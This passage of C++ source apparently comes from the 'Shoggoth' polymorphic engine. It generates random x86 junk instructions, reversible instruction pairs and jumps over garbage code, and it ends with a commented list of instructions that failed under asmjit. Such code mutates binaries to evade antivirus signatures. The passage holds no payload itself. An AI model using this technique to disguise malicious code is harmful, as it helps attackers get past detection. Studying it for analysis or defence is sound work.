        break;
    case 3:
        // CLC instruction - Clear carry flag +
        asmjitAssembler->clc();
        break;
    case 4:
        // CMC instruction - Complement carry flag +
        asmjitAssembler->cmc();
        break;
    case 5:
        // fwait instruction - Causes the processor to check for and handle pending, unmasked, floating-point exceptions before proceedin + VSde okey
        asmjitAssembler->fwait();
        break;
    case 6:
        // fnop instruction - Performs no FPU operation. +
        asmjitAssembler->fnop();
        break;
    case 7:
        // fxam instruction - The fxam instruction examines the value in st(0) and reports the results in the condition code bits +
        asmjitAssembler->fxam();
        break;
    case 8:
        // ftst instruction - The FTST instruction compares the value on the top of stack with zero. +
        asmjitAssembler->ftst();
        break;
    case 9:
        // jmp - pass the next inst
        asmjitAssembler->jmp(randomLabelJmp);
        asmjitAssembler->bind(randomLabelJmp);
        break;
    case 10:
        // xor register,0 - nothing changes +
        asmjitAssembler->xor_(randomRegister, 0);
        break;
    case 11:
        // bt register, register - The CF flag contains the value of the selected bit. +
        asmjitAssembler->bt(randomRegister, randomRegister);
        break;
    case 12:
        // cmp - compare instruction + 
        asmjitAssembler->cmp(randomRegister, randomRegister);
        break;
    case 13:
        // mov instruction +
        asmjitAssembler->mov(randomRegister, randomRegister);
        break;
    case 14:
        // xchg - The XCHG (exchange data) instruction exchanges the contents of two operands. VSde okey
        asmjitAssembler->xchg(randomRegister, randomRegister);
        break;
    case 15:
        // test - bitwise and +
        asmjitAssembler->test(randomRegister, randomRegister);
        break;
    case 16:
        // cmova - The cmova conditional move if above check the state of CF AND ZF. +
        asmjitAssembler->cmova(randomRegister, randomRegister);
        break;
    case 17:
        // cmovb - The cmovb conditional move if below check the state of CF. +
        asmjitAssembler->cmovb(randomRegister, randomRegister);
        break;
    case 18:
        // cmove - similar +
        asmjitAssembler->cmove(randomRegister, randomRegister);
        break;
    case 19:
        // cmovg +
        asmjitAssembler->cmovg(randomRegister, randomRegister);
        break;
    case 20:
        // cmovl +
        asmjitAssembler->cmovl(randomRegister, randomRegister);
        break;
    case 21:
        // cmovo +
        asmjitAssembler->cmovo(randomRegister, randomRegister);
        break;
    case 22:
        // cmovp +
        asmjitAssembler->cmovp(randomRegister, randomRegister);
        break;
    case 23:
        // cmovs +
        asmjitAssembler->cmovs(randomRegister, randomRegister);
        break;
    case 24:
        // cmovae +
        asmjitAssembler->cmovae(randomRegister, randomRegister);
        break;
    case 25:
        // cmovge +
        asmjitAssembler->cmovge(randomRegister, randomRegister);
        break;
    case 26:
        // cmovle +
        asmjitAssembler->cmovle(randomRegister, randomRegister);
        break;
    case 27:
        // cmovne
        asmjitAssembler->cmovne(randomRegister, randomRegister);
        break;
    case 28:
        // cmovng
        asmjitAssembler->cmovng(randomRegister, randomRegister);
        break;
    case 29:
        // cmovnl
        asmjitAssembler->cmovnl(randomRegister, randomRegister);
        break;
    case 30:
        // cmovno
        asmjitAssembler->cmovno(randomRegister, randomRegister);
        break;
    case 31:
        // cmovnp +
        asmjitAssembler->cmovnp(randomRegister, randomRegister);
        break;
    case 32:
        // cmovns + 
        asmjitAssembler->cmovns(randomRegister, randomRegister);
        break;
    case 33:
        // cmovbe +
        asmjitAssembler->cmovbe(randomRegister, randomRegister);
        break;
    default:
        ;
    }
    HeapFree(GetProcessHeap(), NULL, randomString);
}

void ShoggothPolyEngine::GenerateReversedInstructions() {
    int randomIndexForSelect = RandomizeInRange(1, 10);
    x86::Gp randomRegister = this->GetRandomRegister();
    BYTE randomByte = (BYTE)(RandomizeInRange(0, 255));
    BYTE randomRotate = (BYTE)(RandomizeInRange(0, 64));
    switch (randomIndexForSelect) {
    case 1:
        // not register;garbage;not register +
        asmjitAssembler->not_(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->not_(randomRegister);
        break;
    case 2:
        // neg register;garbage;neg register +
        asmjitAssembler->neg(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->neg(randomRegister);
        break;
    case 3:
        // inc register;garbage;dec register + 
        asmjitAssembler->inc(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->dec(randomRegister);
        break;
    case 4:
        // dec register;garbage;inc register +
        asmjitAssembler->dec(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->inc(randomRegister);
        break;
    case 5:
        // push register;garbage;pop register +
        asmjitAssembler->push(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->pop(randomRegister);
        break;
    case 6:
        // bswap register;garbage;bswap register +
        asmjitAssembler->bswap(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->bswap(randomRegister);
        break;
    case 7:
        // add register,value ;garbage;sub register,value +
        asmjitAssembler->add(randomRegister, randomByte);
        this->GenerateGarbageInstructions();
        asmjitAssembler->sub(randomRegister, randomByte);
        break;
    case 8:
        // sub register,value ;garbage;add register,value +
        asmjitAssembler->sub(randomRegister, randomByte);
        this->GenerateGarbageInstructions();
        asmjitAssembler->add(randomRegister, randomByte);
        break;
    case 9:
        // ror register,value ;garbage;rol register,value +
        asmjitAssembler->ror(randomRegister, randomRotate);
        this->GenerateGarbageInstructions();
        asmjitAssembler->rol(randomRegister, randomRotate);
        break;
    case 10:
        // rol register,value ;garbage;ror register,value +
        asmjitAssembler->rol(randomRegister, randomRotate);
        this->GenerateGarbageInstructions();
        asmjitAssembler->ror(randomRegister, randomRotate);
        break;
    default:
        break;
    }
}

void ShoggothPolyEngine::GenerateJumpedInstructions() {
    int randomIndexForSelect = RandomizeInRange(1, 16);
    x86::Gp randomRegister = this->GetRandomRegister();
    char* randomString = GenerateRandomString();
    Label randomLabelJmp = asmjitAssembler->newNamedLabel(randomString, 16);
    switch (randomIndexForSelect) {
        case 1:
            // jmp label;garbage;label: +
            asmjitAssembler->jmp(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 2:
            asmjitAssembler->jae(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 3:
            asmjitAssembler->ja(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 4:
            asmjitAssembler->jbe(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 5:
            asmjitAssembler->jb(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 6:
            asmjitAssembler->je(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 7:
            asmjitAssembler->jge(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 8:
            asmjitAssembler->jg(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 9:
            asmjitAssembler->jle(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 10:
            asmjitAssembler->jl(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 11:
            asmjitAssembler->jne(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 12:
            asmjitAssembler->jnp(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 13:
            asmjitAssembler->jns(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 14:
            asmjitAssembler->jo(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 15:
            asmjitAssembler->jp(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 16:
            asmjitAssembler->js(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        default:
            break;
    }
}

void ShoggothPolyEngine::RandomUnsafeGarbage() {
    x86::Gp randomGeneralPurposeRegisterDest = this->GetRandomGeneralPurposeRegister();
    x86::Gp randomGeneralPurposeRegisterSource = this->GetRandomGeneralPurposeRegister();
    int randomIndexForSelect = RandomizeInRange(1, 16);
    while (randomGeneralPurposeRegisterDest.id() == randomGeneralPurposeRegisterSource.id()) {
        randomGeneralPurposeRegisterDest = this->GetRandomGeneralPurposeRegister();
    }
    asmjitAssembler->push(randomGeneralPurposeRegisterDest);
    BYTE randomValue = (BYTE)(RandomizeInRange(0, 255));
    //TODO : ADD memory examples, 
    switch (randomIndexForSelect) {
    case 1:
        asmjitAssembler->add(randomGeneralPurposeRegisterDest, randomValue);
        break;
    case 2:
        asmjitAssembler->sub(randomGeneralPurposeRegisterDest, randomValue);
        break;
    case 3:
        asmjitAssembler->xor_(randomGeneralPurposeRegisterDest, randomValue);
        break;
    case 4:
        asmjitAssembler->shl(randomGeneralPurposeRegisterDest, randomValue);
        break;
    case 5:
        asmjitAssembler->shr(randomGeneralPurposeRegisterDest, randomValue);
        break;
    default:
        break;
    }
    asmjitAssembler->pop(randomGeneralPurposeRegisterDest);
}

/*    
    // Errored instructions because of asmjit
    
    // cmovc - The cmovc conditional move if carry check the state of CF
    // asmjitAssembler->cmovc(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovz
    // asmjitAssembler->cmovz(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovna
    // asmjitAssembler->cmovna(randomRegister, randomRegister); // Sikinti VSde de
     
    // cmovnb 
    // asmjitAssembler->cmovnb(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovnc 
    // asmjitAssembler->cmovnc(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovnz 
    // asmjitAssembler->cmovnz(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovpe 
    // asmjitAssembler->cmovpe(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovpo 
    // asmjitAssembler->cmovpo(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovnae 
    // asmjitAssembler->cmovnae(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovnbe 
    // asmjitAssembler->cmovnbe(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovnle Sikinti
    // asmjitAssembler->cmovnle(randomRegister, randomRegister); // Sikinti VSde de
    
    // cmovnge Sikinti
    // asmjitAssembler->cmovnge(randomRegister, randomRegister); // Sikinti VSde de

    // jc SIKINTI
        asmjitAssembler->jc(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);
    // jnae SIKINTI
        asmjitAssembler->jnae(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jnbe SIKINTI
        asmjitAssembler->jnbe(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jnb SIKINTI
        asmjitAssembler->jnb(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jnc SIKINTI
        asmjitAssembler->jnc(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jnge SIKINTI
        asmjitAssembler->jnge(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jng SIKINTI
        asmjitAssembler->jng(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jnle SIKINTI
        asmjitAssembler->jnle(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jnl SIKINTI
        asmjitAssembler->jnl(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jnz SIKINTI
        asmjitAssembler->jnz(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jpe SIKINTI
        asmjitAssembler->jpe(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jpo SIKINTI
        asmjitAssembler->jpo(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);

    // jz SIKINTI
        asmjitAssembler->jz(randomLabelJmp);
        this->GenerateGarbageInstruction();
        asmjitAssembler->bind(randomLabelJmp);
*/